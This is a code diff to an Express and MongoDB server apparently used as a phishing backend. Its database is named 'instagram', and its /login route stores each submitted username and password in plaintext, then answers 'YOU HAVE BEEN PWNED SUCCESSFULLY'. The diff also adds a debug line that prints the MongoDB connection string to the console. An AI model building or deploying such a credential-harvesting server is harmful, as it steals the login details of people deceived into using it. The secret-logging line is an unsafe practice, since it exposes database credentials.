@@ -1,3 +1,4 @@
+require("dotenv").config();
 const express = require("express");
 const mongoose = require("mongoose");
 const bodyParser = require("body-parser");
@@ -6,29 +7,28 @@ const path = require("path");
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Middleware to parse URL-encoded and JSON bodies
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Serve static files from the public directory
+// Serve static files
 app.use(express.static(path.join(__dirname, "public")));
 
+// Debugging: Log MongoDB URI (REMOVE AFTER TESTING)
+console.log("🔗 MongoDB URI:", process.env.MONGODB_URI);
+
 // Connect to MongoDB
-mongoose.connect("mongodb://localhost:27017/instagram", {
+mongoose.connect(process.env.MONGODB_URI, {
   useNewUrlParser: true,
   useUnifiedTopology: true,
-});
-
-const db = mongoose.connection;
-db.on("error", console.error.bind(console, "connection error:"));
-db.once("open", () => {
-  console.log("Connected to MongoDB");
-});
+})
+.then(() => console.log("✅ Connected to MongoDB"))
+.catch((err) => console.error("❌ MongoDB Connection Error:", err));
 
 // Define User Schema
 const userSchema = new mongoose.Schema({
-  username: String,
-  password: String,
+  username: { type: String, required: true },
+  password: { type: String, required: true },
 });
 
 const User = mongoose.model("User", userSchema);
@@ -49,16 +49,16 @@ app.post("/login", async (req, res) => {
     await newUser.save();
     res.status(200).send("YOU HAVE BEEN PWNED SUCCESSFULLY 💅");
   } catch (err) {
-    console.error("Error saving user:", err);
+    console.error("❌ Error saving user:", err);
     return res.status(500).send("Error saving user to database");
   }
 });
 
-// Serve the HTML file
+// Serve HTML file
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
 app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`🚀 Server is running on port ${port}`);
 });
